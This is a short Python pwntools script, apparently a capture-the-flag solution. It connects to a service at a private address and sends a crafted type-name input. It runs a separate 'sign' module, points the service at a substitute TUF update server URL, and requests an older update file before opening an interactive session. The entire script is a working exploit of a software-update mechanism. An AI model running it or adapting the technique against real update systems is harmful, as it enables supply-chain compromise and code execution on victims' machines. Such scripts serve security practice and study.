#!/usr/bin/env python3
from pwn import *
import sign

conn = remote('172.28.2.64', 38002)
context.log_level = "critical"
payload1 = b'tcmupdate_v0[\D]3'
url = b'http://172.28.2.13:8003'

print(conn.recvuntil(b'Enter type name:').decode())
print(payload1.decode())
conn.sendline(payload1)
conn.recvuntil(b'Running tcmupdate_v0.3.0.py')

sign.sign_all()

print(conn.recvuntil(b'Enter a TUF server URL:').decode())
print(url.decode())
conn.sendline(url)
print(conn.recvline_regex(b'You entered: ').decode())

print(conn.recvuntil(b'Enter a file path to download: ').decode())
conn.sendline(b'tcmupdate_v0.2.0.py')

conn.interactive()
conn.close()
